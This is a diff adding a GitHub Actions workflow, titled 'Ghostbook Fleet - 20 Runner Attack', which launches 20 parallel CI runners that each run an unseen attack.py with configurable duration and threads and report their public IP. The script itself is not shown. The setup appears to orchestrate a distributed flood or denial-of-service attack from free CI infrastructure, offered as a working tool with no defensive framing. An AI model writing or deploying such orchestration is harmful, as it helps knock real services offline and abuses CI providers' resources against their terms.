@@ -1,0 +1,58 @@
+name: "Ghostbook Fleet - 20 Runner Attack"
+
+on:
+  workflow_dispatch:
+    inputs:
+      duration:
+        description: 'Attack duration per runner (seconds)'
+        required: false
+        default: '120'
+        type: string
+      threads:
+        description: 'Threads per runner (3 = optimal)'
+        required: false
+        default: '3'
+        type: string
+
+jobs:
+  attack:
+    name: "Node #${{ matrix.node_id }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    strategy:
+      fail-fast: false
+      max-parallel: 20
+      matrix:
+        node_id: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
+    
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Setup Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.11'
+
+      - name: Install dependencies
+        run: pip install aiohttp
+
+      - name: Display runner info
+        run: |
+          echo "Runner IP: $(curl -s ifconfig.me)"
+          echo "Runner hostname: $(hostname)"
+          echo "Node ID: ${{ matrix.node_id }}"
+          echo "Duration: ${{ github.event.inputs.duration || '120' }}s"
+          echo "Threads: ${{ github.event.inputs.threads || '3' }}"
+
+      - name: Execute attack
+        run: |
+          python3 attack.py
+        env:
+          DURATION: ${{ github.event.inputs.duration || '120' }}
+          THREADS: ${{ github.event.inputs.threads || '3' }}
+          NODE_ID: ${{ matrix.node_id }}
+
+      - name: Done
+        if: always()
+        run: echo "Node ${{ matrix.node_id }} finished"
